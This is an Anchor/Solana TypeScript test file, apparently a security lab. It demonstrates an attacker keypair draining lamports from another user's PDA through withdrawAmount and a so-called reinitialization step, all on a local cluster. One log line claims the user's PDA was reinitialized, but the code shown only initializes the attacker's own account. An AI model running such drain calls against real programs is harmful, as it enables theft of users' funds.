import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { ReintializationAttack } from "../target/types/reintialization_attack";
import { SYSTEM_PROGRAM_ID } from "@coral-xyz/anchor/dist/cjs/native/system";

async function airDropSol(
  amount: number,
  provider: anchor.AnchorProvider,
  to: anchor.web3.PublicKey
) {
  try {
    const tx = await provider.connection.requestAirdrop(
      to,
      amount * anchor.web3.LAMPORTS_PER_SOL
    );

    await provider.connection.confirmTransaction(tx, "confirmed");
  } catch (error) {
    console.log(`You got an error while airdropping sol  🦀`);
  }
}

async function getAccount(
  address: anchor.web3.PublicKey,
  provider: anchor.AnchorProvider
) {
  try {
    const account = await provider.connection.getAccountInfo(address);
    return account;
  } catch (error) {
    console.error(`Got error while frecting AccountInfo: ${error}`);
  }
}

describe("reintialization_attack", () => {
  // Configure the client to use the local cluster.
  let provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const program = anchor.workspace
    .reintializationAttack as Program<ReintializationAttack>;

  let user_pda: anchor.web3.PublicKey;
  let amount: number;
  let attacker: anchor.web3.Keypair;
  let attacker_pda: anchor.web3.PublicKey;

  it("Is initialized!", async () => {
    try {
      // Add your test here.
      [user_pda] = anchor.web3.PublicKey.findProgramAddressSync(
        [Buffer.from("user"), provider.wallet.payer.publicKey.toBytes()],
        program.programId
      );
      amount = 10;

      let tx = await program.methods
        .depositUserAmount(new anchor.BN(amount))
        .accountsStrict({
          user: provider.wallet.payer.publicKey,
          userAccount: user_pda,
          systemProgram: SYSTEM_PROGRAM_ID,
        })
        .signers([provider.wallet.payer])
        .rpc();
      let userPDA = await program.account.user.fetch(user_pda);
      console.log(
        `Before attack the state of the Data --> admin: ${userPDA.userAdmin} and the balance: ${userPDA.balance}`
      );
      console.log(`Everythinhg went well ${tx}`);
    } catch (error) {
      console.error(`You got an error onciha ⚠️  :`, error);
    }
  });

  it("Attacker will drain the Lamports ", async () => {
    attacker = anchor.web3.Keypair.generate();
    await airDropSol(10, provider, attacker.publicKey);
    try {
      let tx = await program.methods
        .withdrawAmount()
        .accountsStrict({
          user: attacker.publicKey,
          userAccount: user_pda,
          systemProgram: SYSTEM_PROGRAM_ID,
        })
        .signers([attacker])
        .rpc();

      console.log(`Attacker successfully drained the Lamports ${tx}`);
    } catch (error) {
      console.error(
        `Attacker not successfully drained the Lamports ⚠️  :`,
        error
      );
    }
  });

  it("ReintializationAttack 😈", async () => {
    try {
      [attacker_pda] = anchor.web3.PublicKey.findProgramAddressSync(
        [Buffer.from("user"), attacker.publicKey.toBytes()],
        program.programId
      );

      amount = 0;

      let tx = await program.methods
        .depositUserAmount(new anchor.BN(amount))
        .accountsStrict({
          user: attacker.publicKey,
          userAccount: attacker_pda,
          systemProgram: SYSTEM_PROGRAM_ID,
        })
        .signers([attacker])
        .rpc({ skipPreflight: true });

      console.log(
        `Everythinhg went well attacker successfully reintialized the user_pda: ${tx}`
      );
      const attackerPDA = await program.account.user.fetch(attacker_pda);
      console.log(
        `The new reintialized satate is ---> admin: ${attackerPDA.userAdmin} and balance ${attackerPDA.balance}`
      );
    } catch (error) {
      console.error(`Attacker failed in rein`, error);
    }
  });
});
